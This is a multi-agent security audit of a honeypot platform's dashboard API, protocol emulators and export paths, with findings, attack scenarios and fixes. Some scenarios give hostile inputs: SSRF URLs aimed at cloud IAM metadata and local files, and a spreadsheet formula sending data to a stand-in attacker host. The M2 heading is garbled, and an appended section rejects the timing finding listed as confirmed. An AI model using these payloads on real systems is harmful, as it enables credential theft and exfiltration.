# ClownPeanuts Security Hardening Review

_Multi-agent audit: 29 reviewers (24 subsystem + 5 cross-cutting vuln-class sweeps), each finding adversarially verified by independent skeptics. 41 findings raised, 27 confirmed, 14 rejected as false positives._

## Remediation status (2026-06-22)

All confirmed findings were addressed on the `hdl/hardening` branch. Test baseline before changes: 568 passed, 1 skipped, 4 failed (the 4 failures are a pre-existing environment artifact: a real Redis is reachable on 127.0.0.1:6379, so the "redis unavailable" fallback tests do not trigger; unrelated to this work). After changes: 606 passed, 1 skipped, same 4 environment failures, with 38 new regression tests.

Post-review follow-up (2026-07-22): Redis URLs now reject explicit port `0`, making those fallback tests hermetic; the dashboard-auth G3 architecture was fully replaced with credential login, signed sessions, same-origin proxying, and short-lived WebSocket tickets. Current suite: `637 passed, 1 skipped`.

## Executive summary

ClownPeanuts is a defensive honeypot platform, and the deception emulators are working as intended (accepting hostile commands and serving fake data is the product). The real exposure sits in the operator-facing seam: the dashboard API, the outbound integration paths, and the binary protocol parsers that are operator code even though the wire formats are faux. The standout issue is an unauthenticated server-side request forgery in the dirtylaundry share endpoints, which lets a caller drive the platform to fetch arbitrary URLs including cloud metadata (169.254.169.254), loopback/RFC1918 internal services, and local files via the file:// scheme. The fetched body is reflected to the caller, so it is a full read SSRF and arbitrary-file-read oracle, and the dashboard ships with auth disabled by default. The correct defenses already exist in this repo (intel/rotation.py and the recent _validate_hosted_endpoint), they were simply never applied to the share path. The second systemic theme is availability of the platform itself: every threaded emulator (HTTP, MySQL, SSH) lacks a wall-clock connection deadline, so a trivial slowloris from one attacker can pin the bounded connection-slot pool and take the honeypot offline, and the MongoDB BSON parser has unbounded recursion plus an uncaught int() conversion that lets a single tiny crafted frame crash connection handlers and flood operator logs. The remaining findings are defense-in-depth: non-constant-time token comparison in the auth path, CSV formula injection in the SOC handoff export, attacker-controlled max_tokens reaching in-process llama.cpp unclamped, a spoofable X-Forwarded-For rate-limit bypass, an off-by-one in the operator score-budget guard, unbounded share-response reads, store-accounting gaps in Redis/memcached, and a CSP that is gated on NODE_ENV. Overall posture: the deception core is sound and several outbound paths were recently hardened, but the dirtylaundry share path is a serious miss that should be fixed immediately, followed by the parser-robustness and slowloris availability gaps. Fixing the SSRF and the three parser/timeout issues addresses the bulk of the cross-boundary risk.

## High

### H1. Unauthenticated SSRF and arbitrary local file read via dirtylaundry share push/pull
- Files/lines: `clownpeanuts/dashboard/api.py:1570-1589` (routes), `clownpeanuts/agents/dirtylaundry/runtime.py:452-506` (passthrough), `clownpeanuts/agents/dirtylaundry/sharing.py:197-239` (outbound call), `_read_json_response` at `sharing.py:184-194`; default-off auth at `clownpeanuts/config/schema.py:73` and `clownpeanuts/dashboard/api.py:99`.
- Category: SSRF / arbitrary file read / secret leakage.
- Description: `POST /ecosystem/dirtylaundry/share/push` and `/share/pull` accept a free-form `endpoint` query parameter and pass it (after only `.strip()` and a non-empty check) straight into `push_share_payload` / `pull_share_payload`, which build a `urllib.request.Request` and call `urllib.request.urlopen` with NO scheme allow-list, NO host/IP validation, and default redirect following. The destination is caller-controlled at request time. Because `urllib`'s default opener honors `file://` (and ftp/data) and follows HTTP 30x redirects, and because the pull path reads and returns the fetched body to the caller (`remote`/import field), this is a full read SSRF oracle plus an arbitrary local-file-read primitive, not blind. `api.auth_enabled` defaults to False, so in a default deployment these routes need no credentials. The error path re-raises the raw urllib exception via `HTTPException(detail=str(exc))` (`api.py:1578-1579, 1588-1589`), turning even failures into an internal-host/port/file-existence oracle that leaks resolved internal IPs.
- Attack scenario: A caller reaching the API (loopback, a reverse-proxy/SSRF chain, or a CSRF-style request from the operator browser since a cookie token is accepted) issues `POST /ecosystem/dirtylaundry/share/pull?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/` to exfiltrate cloud IAM credentials, `?endpoint=http://127.0.0.1:6379/` to reach internal-only services, or `?endpoint=file:///etc/passwd` to read host files (the body is returned). A 302 from an attacker-controlled https host to `http://169.254.169.254` bypasses any naive scheme check because redirects are followed.
- Why it crosses the boundary: an attacker-reachable request causes an OPERATOR-side component to issue arbitrary outbound requests to internal/cloud/loopback targets and read local files, then reflects the result back to the caller.
- Fix: Validate `endpoint` before any outbound call, mirroring the correct pattern already in `clownpeanuts/intel/rotation.py:118-178` and `_validate_hosted_endpoint` (commit dfad894). Restrict scheme to {http, https} (build the opener without `FileHandler`); reject URLs with userinfo; resolve the host and reject loopback, RFC1918/private, link-local (169.254.0.0/16, fe80::/10), unique-local, multicast, reserved, and unspecified addresses unless an explicit `allow_private` opt-in is set; re-resolve immediately before connect (DNS-rebind); reject non-ASCII/IDN hosts. Install a custom opener with a `HTTPRedirectHandler` that re-validates or refuses redirect targets. Apply in both `push_share_payload` and `pull_share_payload` (covers config-set and request-set endpoints) and pre-validate in `api.py` before dispatch. Sanitize the error returned to the client so it does not echo the raw urllib exception. Centralize this in a shared safe-fetch helper used by sharing.py, rotation.py, and the alert/LLM adapters. Strongly consider gating these routes on operator auth and defaulting `auth_enabled` to True.

### H2. No socket read timeout on the HTTP emulator handler (slowloris exhausts the connection-slot pool)
- Files/lines: `clownpeanuts/services/http/emulator.py:466-482` (AdminHandler in `_build_handler`, no `timeout`), `:488`, `:577-578` (`handler.rfile.read(content_length)`); semaphore release at `:41-45`, reject path at `:28-34`.
- Category: DoS (platform availability).
- Description: `AdminHandler` sets no `timeout`, so it inherits `BaseHTTPRequestHandler.timeout = None`. The server is a ThreadingHTTPServer subclass and the request socket has no read timeout, so blocking `rfile.readline()` (request line/headers) and `rfile.read(content_length)` (POST body) park a worker thread indefinitely. `_BoundedThreadingHTTPServer` caps concurrency via a BoundedSemaphore (default `max_concurrent_connections` = 256) released only in `process_request_thread`'s finally, i.e. after the stalled request completes. About 256 slow connections from one attacker permanently exhaust the pool, after which `process_request` immediately closes every new connection.
- Attack scenario: Attacker opens 256+ connections, sends a partial request line or a large `Content-Length` then trickles one body byte every 5-10 seconds (classic slowloris). Each parks a thread holding a semaphore slot; once all slots are held the honeypot is offline for everyone else at trivial attacker bandwidth.
- Why it crosses the boundary: the ATTACKER controls the stall and consumes a bounded operator resource (distinct from operator-driven tarpitting).
- Fix: Add a concrete `timeout = 10` (or configured) class attribute on `AdminHandler` so BaseHTTPRequestHandler applies `settimeout` to the connection socket, and/or call `request.settimeout(...)` in `process_request` before delegating. Enforce a wall-clock cap on total header+body read time. Keep these independent of intentional tarpit delays.

## Medium

### M1. Unbounded recursion in the MongoDB BSON decoder crashes connection handlers and floods logs
- Files/lines: `clownpeanuts/services/database/mongo_emulator.py:974-1026` (`_decode_document`/`_decode_value`, recursion at `1007-1012`), reached from `_parse_op_msg`/`_parse_op_query` at `890-923` via `_handle_client` at `251-339` (no try/except).
- Category: DoS / parser crash.
- Description: `_decode_document` recurses into `_decode_value` for embedded-document (0x03) and array (0x04) elements, which call `_decode_document` again, with NO depth limit. The only bound is the 8 MiB frame cap (`_MAX_MESSAGE_SIZE_BYTES`). A nested sub-document costs only ~6-7 bytes on the wire, so an 8 MiB OP_MSG/OP_QUERY can encode well over a million nesting levels, far beyond Python's ~1000 recursion limit. A few KB is already enough. The resulting RecursionError is uncaught through `_parse_op_msg`/`_parse_op_query`/`_handle_client` and surfaces via socketserver's default `handle_error` as a multi-thousand-frame stderr traceback. The listener survives (ThreadingMixIn) and the concurrency slot is released in the finally, so this is not a full-platform crash, but each crafted frame aborts the connection thread, burns deep stack/CPU, and lets an attacker spam tracebacks to obscure operator logs. The project already guards this class for JSON at `clownpeanuts/services/vuln_llm/emulator.py:454-458`, so the BSON path is an inconsistent gap.
- Attack scenario: Connect to port 27017, send one OP_MSG whose section-0 body is a BSON document nested ~2000+ levels deep (a few KB). Repeat across connections for sustained CPU churn, thread teardown, and log flooding, while escaping deception/tarpitting at will.
- Fix: Add an explicit `depth` parameter to `_decode_document`/`_decode_value`, increment on recursion into 0x03/0x04, and return early (e.g. `({}, end)`) once a small cap (64) is exceeded. Additionally wrap the parse calls in `_handle_client` in try/except catching RecursionError (and broadly ValueError/struct.error) to close the connection cleanly, mirroring the vuln_llm guard.

### M2. dirtylaundry share comparison/egress not constant-time is covered above; this slot: attacker-controlled max_tokens not clamped before in-process llama.cpp
- Files/lines: `clownpeanuts/services/vuln_llm/inference/local_llama_cpp.py:80-128`; origin at `clownpeanuts/services/vuln_llm/emulator.py:834` (`_merge_gen_params`) and synchronous invocation at `emulator.py:764`.
- Category: DoS (host resource exhaustion).
- Description: `LocalLlamaCppBackend` bounds INPUT (`_truncate_messages` caps per-message content to 8 KiB and keeps the last 16 messages) but applies NO bound to OUTPUT: `params.max_tokens` is forwarded verbatim into `create_chat_completion(..., max_tokens=params.max_tokens)`. The value comes from the attacker request body, accepted in `_merge_gen_params` as `int(max_t)` with no upper clamp, and the backend runs synchronously on a single in-process model. An attacker can request an arbitrarily large completion, pinning host CPU/GPU per request. The deliberate input truncation here shows the author intended to prevent exactly this worker-pinning class but missed the output dimension.
- Attack scenario: POST `/v1/chat/completions` with `"max_tokens": 100000000` and a short prompt against a pack using the local-llama-cpp backend; llama.cpp generates toward that budget, saturating the host. A few concurrent requests exhaust inference capacity.
- Fix: Clamp inside `LocalLlamaCppBackend.generate` (`effective_max = max(1, min(params.max_tokens, self._MAX_OUTPUT_TOKENS))`, sized to n_ctx, e.g. 1024-2048), and also clamp in `_merge_gen_params` so every backend benefits. Add a wall-clock generation deadline.

### M3. API/WebSocket auth token comparison is not constant-time (timing oracle on operator/viewer tokens)
- Files/lines: `clownpeanuts/dashboard/api.py:650-657` (`_resolve_role_for_token`), token sets at `100-103`, WebSocket subprotocol path at `659-710`.
- Category: Crypto / auth.
- Description: Tokens are validated with set membership (`token in operator_tokens` / `token in viewer_tokens`), which resolves to `str.__eq__` and short-circuits at the first differing byte, leaking prefix-match length via timing. There is no `hmac`/`secrets` import in api.py, so every path (Authorization: Bearer, X-API-Key, `cp_api_token` cookie, base64url `cp-auth.` WebSocket subprotocol) funnels into this non-constant-time check. This is the real operator trust boundary (attacker -> operator mutation access), and binding to a non-loopback host is permitted once `auth_enabled=true` per `cli.py:966`.
- Attack scenario: With auth enabled and the API reachable, submit many guessed tokens and measure latency to recover a configured token byte-by-byte, then replay for operator role.
- Fix: Compare with `hmac.compare_digest` over a fixed-length transform (e.g. SHA-256 digest of candidate vs each stored token), OR-accumulating the result and evaluating the same number of comparisons regardless of match, with no early exit. Encode to bytes first. (Practical risk depends on token entropy and network jitter, but this is the auth boundary and should be constant-time.)

### M4. CSV/TSV formula injection in the SOC handoff export
- Files/lines: `clownpeanuts/intel/handoff.py:138-212` (`build_soc_handoff`), session fields sourced at `clownpeanuts/intel/collector.py:81-82`.
- Category: CSV (formula) injection / downstream poisoning.
- Description: `build_soc_handoff` writes session rows via `csv.DictWriter` with no spreadsheet-formula neutralization. `session_id` and `source_ip` come straight from the session record (`source_ip` is whatever string the honeypot recorded for the connection and is not constrained to a valid IP at this layer), and `classification` is derived. CSV quoting protects parsing, not formula triggers, so a value starting with `=`, `+`, `-`, `@`, tab, or CR is preserved literally. When an operator opens the handoff in Excel/Sheets the cell executes as a formula (data exfiltration via `=WEBSERVICE`/`=HYPERLINK`, or DDE command execution on vulnerable Excel).
- Attack scenario: Attacker activity is recorded with a crafted `source_ip`/`session_id` beginning with `=`; an analyst exports and opens the CSV/TSV, and `=WEBSERVICE("http://attacker/?"&B2)` ships neighboring intel to the attacker. The poison also propagates to any SIEM ingesting the CSV.
- Fix: Neutralize formula-trigger characters on every string cell before `writerow` in both the CSV and TSV writers (prefix a leading apostrophe when the first char is `= + - @ \t \r`). Centralize in a helper and apply to `session_id`, `source_ip`, `technique_name`, `classification`, and any other free-form string column.

## Low

### L1. No wall-clock connection deadline in the MySQL emulator (slowloris pins connection slots)
- Files/lines: `clownpeanuts/services/database/mysql_emulator.py:266` (per-recv timeout only), `329-333` (command loop), `1279-1305` (`_recv_exact`); semaphore reject at `_ThreadingTCPServer.process_request:29-34`.
- Category: DoS.
- Description: The handler sets only a per-recv idle timeout (`conn.settimeout(self._socket_timeout_seconds)`, default 45s) that resets on every received byte, so there is no upper bound on connection lifetime. A client sending one byte every ~44s holds its BoundedSemaphore slot (default 256, cap 5000) and thread indefinitely; once all slots are held, new MySQL connections are closed immediately and the operator loses visibility on that port. Distinct from the per-response tarpit (AdaptiveThrottle), which the platform controls.
- Fix: Record `start = time.monotonic()` in `_handle_client` and abort (close, return) in the command loop and inside `_recv_exact` once `time.monotonic() - start` exceeds a configurable max (e.g. 300s). Optionally cap commands per connection.

### L2. No wall-clock connection deadline in the SSH emulator (slowloris pins connection slots)
- Files/lines: `clownpeanuts/services/ssh/emulator.py:306-429`; per-recv timeout at `307`, byte-at-a-time read at `412-413`, auth/command loops at `328`/`363`; BoundedSemaphore at `24-25/63`, reject at `29-34`.
- Category: DoS.
- Description: `_recvline` reads one byte at a time via `conn.recv(1)`, and `settimeout` governs each recv, not connection lifetime; the auth and command while-loops have no wall-clock cap. An attacker sending one byte every ~40s holds a daemon thread and one of the 256 slots forever. 256 such connections exhaust the pool and `process_request` closes all further connections, blinding the platform. Distinct from operator-controlled `AdaptiveThrottle.maybe_delay` tarpitting (lines 349, 387).
- Fix: Record a monotonic start in `_handle_client` and `_recvline`, abort once a max handshake/session duration is exceeded regardless of trickle activity; cap bytes/lines per connection and prompt iterations; consider a shorter idle timeout pre-auth.

### L3. Uncaught ValueError when decoding a BSON array (0x04) with non-numeric keys
- Files/lines: `clownpeanuts/services/database/mongo_emulator.py:1009-1012`; reached via `_handle_client:256-328` with no try/except.
- Category: Parser crash / DoS.
- Description: For array elements (0x04) the code sorts the embedded document with `key=lambda item: int(item[0])`. Array keys are attacker-controlled cstrings (decoded by `_decode_cstring` without numeric validation); any non-numeric key (e.g. `'x'`) makes `int('x')` raise ValueError, which propagates uncaught and aborts the connection handler thread with a traceback. A real driver never sends such keys; a raw-frame attacker trivially can. (Same uncaught-parse root as M1.)
- Fix: Guard the conversion (try/except returning a large sentinel, or preserve insertion order on failure), and wrap the parse in `_handle_client` in try/except so any parser exception closes the connection gracefully.

### L4. Rate-limit bypass and tracking-map churn via spoofable X-Forwarded-For
- Files/lines: `clownpeanuts/dashboard/api.py:334-347` (`_client_identity_from_headers`), consumed at `1036-1048` / `1042` (`_rate_limit_consume(_request_client_identity(request))`).
- Category: DoS-control weakness.
- Description: `_client_identity_from_headers` unconditionally uses the first `X-Forwarded-For` entry as the rate-limit bucket key, with no trusted-proxy allowlist and no toggle for whether a proxy is actually present. The value is fully attacker-controlled when the API is reached directly, so rotating XFF per request yields a fresh full token bucket every time, defeating the limiter that protects the platform. The same untrusted value keys `rate_limit_state`, so rotation also churns the map (trimmed at MAX_RATE_LIMIT_TRACKED_CLIENTS, evicting legitimate clients' buckets). Does not affect token auth (header/cookie based).
- Attack scenario: With `rate_limit_enabled=true`, send each request with `X-Forwarded-For: 1.2.3.<n>`; every request is a new full-bucket client, so floods against expensive endpoints (intel report builds, theater exports, the dirtylaundry route in H1) are never throttled.
- Fix: Only honor XFF when `request.client.host` is in an operator-configured trusted-proxy allowlist; otherwise key on `request.client.host`. Make XFF trust an explicit config flag (default off) and parse right-to-left skipping the configured trusted-hop count rather than taking the leftmost entry.

### L5. Unbounded response.read() / JSON nesting from share peer (operator-side memory exhaustion)
- Files/lines: `clownpeanuts/agents/dirtylaundry/sharing.py:184-194` (`_read_json_response`), used by `push_share_payload`/`pull_share_payload` at `197-239`.
- Category: DoS.
- Description: `_read_json_response` calls `response.read()` with no byte cap and `json.loads` with no recursion guard on the body from a share endpoint (a third-party peer, not the operator). A malicious/compromised peer or on-path attacker can stream a multi-GB body (buffered fully into memory, OOM) or deeply nested JSON (RecursionError). `timeout_seconds` bounds per-read wall-clock, not total bytes. (Related to H1; fix alongside it.)
- Fix: `raw = response.read(MAX_SHARE_BYTES + 1)` and reject if larger (a few MB ceiling); optionally pre-check Content-Length; wrap `json.loads` to catch RecursionError. Mirror the byte-cap pattern in `intel/rotation.py` and `engine/rabbit_hole.py`.

### L6. Quadratic full-store rescan on every write holds the global store lock (Redis and memcached)
- Files/lines: `clownpeanuts/services/database/redis_emulator.py:1634-1648` (`_total_store_bytes_locked`/`_fits_key_updates_locked`, called from many mutators incl. `373, 388, 435, 508, 772, 793, 815, 830, 845, 1084, 1109, 1217, 1651`); identical pattern in `clownpeanuts/services/database/memcached_emulator.py` (`_can_store_value_locked`/`_current_store_bytes_locked`).
- Category: DoS.
- Description: Every mutating command recomputes the total stored bytes by re-summing every value of every key across all four backing dicts (and re-iterating every container element) while holding the global `_store_lock` (an RLock serializing all connections for the service). Work is O(total bytes stored) per write, becoming quadratic over a session as the store fills toward the 64 MB cap, and serializes every other client behind the lock.
- Attack scenario: One connection issues tens of thousands of medium SETs; each write rescans the growing store under the lock, driving the worker to 100% CPU and stalling all concurrent sessions for that service.
- Fix: Maintain a running integer byte counter incremented/decremented on insert/update/delete so capacity checks are O(1); apply to both emulators.

### L7. Memory-cap guard excludes key names, allowing unbounded key-name memory growth
- Files/lines: `clownpeanuts/services/database/redis_emulator.py:1634-1648` and `clownpeanuts/services/database/memcached_emulator.py:524-531`.
- Category: DoS.
- Description: The 64 MB `_MAX_TOTAL_STORE_BYTES` budget counts only VALUE bytes, never key-name bytes. A Redis key name can be up to `_MAX_RESP_BULK_BYTES` (65536) yet contributes 0 to the budget; memcached is the same. An attacker storing many keys with empty/tiny values never trips the OOM guard even though key strings, dict entries, and per-entry overhead (`_store`, `_hash_store`, `_list_store`, `_set_store`, `_expirations`, `_cas_tokens`) consume real RAM.
- Attack scenario: Flood `SET <largekey> ""` (Redis) or `set <key> 0 0 0` with empty values (memcached); the check always passes and memory grows until the host OOMs.
- Fix: Include encoded key-name length plus a fixed per-entry overhead estimate in usage accounting and/or cap the total number of stored keys. Folding key bytes into the L6 running counter closes both at once.

### L8. Attacker-controlled `stop`/`max_tokens` generation params not value-validated before the backend
- Files/lines: `clownpeanuts/services/vuln_llm/emulator.py:823-837` (`_merge_gen_params`); consumed at `local_llama_cpp.py:125` (`kwargs["stop"] = list(params.stop)`); backend exceptions caught at `emulator.py:767-787`.
- Category: Logic bug / defense-in-depth (related to M2).
- Description: `_merge_gen_params` builds `GenerationParams` from the attacker body with only `isinstance` checks: `stop` is accepted whenever it is a list with no element-type or length bound, and `max_tokens`/`temperature`/`top_p` have no range clamp. A huge `stop` list is matched against every generated token (O(stop_count x tokens)) by llama.cpp; non-string entries raise inside the backend and force the echo fallback; for the hosted backend the unvalidated list and unbounded `max_tokens` are forwarded upstream. Impact is contained because backend exceptions fall back to echo, so this is robustness rather than compromise (the unbounded `max_tokens` worker-pinning is the M2 issue).
- Fix: In `_merge_gen_params` keep only string `stop` elements and cap length (e.g. `[:8]`); clamp `max_tokens` (e.g. 1-4096), `temperature` to [0,2], `top_p` to [0,1]; exclude `bool` from numeric checks.

### L9. Operator classifier score-budget cap is off-by-one and does not prevent canary routing on benign traffic
- Files/lines: `clownpeanuts/personas/traps/classifier.py:219-241`; routing at `clownpeanuts/personas/traps/layer.py:261-262`.
- Category: Logic bug / correctness (operator config is trusted, so not attacker-driven).
- Description: The score-budget guard (commit 42fa19f) caps the operator contribution with `operator_score = min(operator_score_raw, self.threshold)`, intending "operator alone (<= threshold) -> at most probing". But the label ladder treats `combined_score < threshold` as probing and `threshold <= combined_score < 1.0` as `jailbreak_attempt`. Clamping to EXACTLY `threshold` lands on the inclusive jailbreak boundary: a catch-all operator rule (`regex "."`, score 1.0) yields `stage1_score = 0.5`, and `0.5 < 0.5` is False, so the verdict is `jailbreak_attempt`. Both `jailbreak_attempt` and `exploit_chain` route to `canary_response`, so the documented guarantee is false and every benign turn is routed to canary, issuing canary tokens and polluting intel with false issuances.
- Fix: Cap strictly below the boundary (`min(operator_score_raw, nextafter(self.threshold, 0))` or `threshold - epsilon`), or require `pack_score > 0` for any jailbreak/exploit label when the only contribution is operator. Add a regression test that an operator-only catch-all classifies benign text as at most `probing`.

### L10. CSP and HSTS gated on NODE_ENV=production, leaving the intel-rendering dashboard with no CSP in non-production deployments
- Files/lines: `dashboard/next.config.mjs:9-45`.
- Category: XSS hardening (defense-in-depth).
- Description: The dashboard renders large amounts of attacker-controlled intel (source IPs, command actions, free-text event messages, session ids, MITRE technique names, canary token strings) into the operator UI. CSP and HSTS live only in `productionOnlyHeaders`, included only when `process.env.NODE_ENV === 'production'`. Any non-production deployment (running `next dev`/`next start` without the var, staging, or a container image whose entrypoint omits it) serves the operator console with NO CSP, removing the key second line of defense exactly where hostile strings are concatenated into the DOM. A future unescaped-render regression (e.g. a `dangerouslySetInnerHTML` for a markdown handoff) would then execute with the operator session, including same-origin fetches to privileged endpoints (apply-lure, label, alert test, rotate).
- Fix: Always emit CSP (and a baseline header set) regardless of NODE_ENV. Keep HSTS production-only (it needs HTTPS) but move CSP to the common list. Provide a dev-permissive CSP variant if HMR needs `unsafe-eval`, but never serve the console with zero CSP.

### G3. Dashboard auth-token delivery / cookie-minting route - dashboard/app/api/auth/session/route.ts and dashboard/app/lib/api.ts cpFetch; no API proxy rewrite in dashboard/next.config.mjs

- Why: The Next.js route mints a cookie containing the operator API token (process.env.CLOWNPEANUTS_API_TOKEN) on the DASHBOARD origin, on both unauthenticated GET and POST, with `secure` gated on NODE_ENV==='production' (so plaintext-HTTP exposure in any non-prod deploy). Recommend POST-only + same-origin proxying of API calls, and removing the NODE_ENV gate on `secure`.

### G4. docker-compose `api`/`ops` profile auth-config inconsistency - docker-compose.yml `api` service (binds --host 0.0.0.0, loads defaults.yml) vs clownpeanuts/config/defaults.yml (auth_enabled=${CP_API_AUTH_ENABLED:-false}) and CLI guard clownpeanuts/cli.py:966

### G5. DNS-rebind/TOCTOU residual in operator-side outbound SSRF guards - clownpeanuts/core/logging.py:184-224 (_validate_http_endpoint) and clownpeanuts/intel/rotation.py:143-178 (_read_source)

- Why: Both SIEM HTTP logging and threat-feed rotation validate the destination by resolving the host with socket.getaddrinfo and rejecting private/loopback IPs, then call urllib request.urlopen - which performs its OWN independent DNS resolution that is not pinned to the validated IP set. These destinations are operator config rather than attacker-controlled, so severity is lower, but the SSRF defenses are incomplete in the same way and were apparently accepted as sufficient by siem-logging and the SSRF sweep. The empty-host early-return at logging.py:188-190 also lets a hostless/file-style endpoint through to urlopen.
- Suggested focus: Confirm whether any of these destinations can be influenced by attacker-reachable data (e.g. feed URLs templated from intel). Recommend pinning: resolve once, then connect by IP with an explicit Host header (or a custom resolver that returns only the validated IP), rather than re-resolving inside urlopen. Apply the same fix to the confirmed alerts SSRF and any other urlopen sites (alerts/webhook.py, pagerduty.py).

- **API/WebSocket bearer-token comparison is not constant-time (timing oracle for operator/viewer token recovery)** [medium] `/Users/matt/code/clownpeanuts/clownpeanuts/dashboard/api.py:650-657 (also 100-103, 660-710)`
  - Rejection reason: The cited code is present exactly as described: clownpeanuts/dashboard/api.py:650-657 resolves roles via `token in operator_tokens` / `token in viewer_tokens` where both are Python `set` objects built at api.py:100-103, and this backs every HTTP path (_http_auth_role, 659-673) and WebSocket path (_websocket_auth_role, 675-710). Grep confirms no hmac/compare_digest anywhere in the package. The deployment model is also as claimed: cli.py:966-968 permits binding to a non-loopback host when api.auth_enabled=true, so the operator token does gate all mutating endpoints and is reachable by network clients.

However, the finding's core technical claim - a classic byte-by-byte remote timing oracle because `str.__eq__` short-circuits at the first differing byte - does not actually hold for `set` membership, which is how the code is written. CPython `in`-on-a-set computes hash(token) over the entire candidate and probes the hash table; str.__eq__ is invoked only on a hash-bucket collision, which for an attacker-chosen candidate essentially never collides with the stored secret's bucket. Even when __eq__ does run, CPython compares length and the cached hash before any bytewise compare, and the underlying memcmp does not expose progressive matching-prefix-length timing. There is therefore no observable "correct-prefix guesses take longer" signal for the attacker to amplify, so the described reconstruction attack (guess token byte-by-byte across many samples) is not viable. The attack_scenario as written is not reachable.

What remains is a legitimate but minor hardening gap: secret-credential comparison should use hmac.compare_digest as defense-in-depth (and to stay robust if the implementation ever changes to a direct == on tokens, or against same-length equal-token edge cases). Given operator-configured high-entropy tokens, network jitter, and the set-membership semantics, this is an info/low best-practice nit, not a medium-severity exploitable timing oracle. Marking real=false because the medium-severity exploitable vulnerability as described (network byte-by-byte operator-token recovery) is not actually realizable against this code path; the recommended compare_digest fix is still worth applying as hardening.
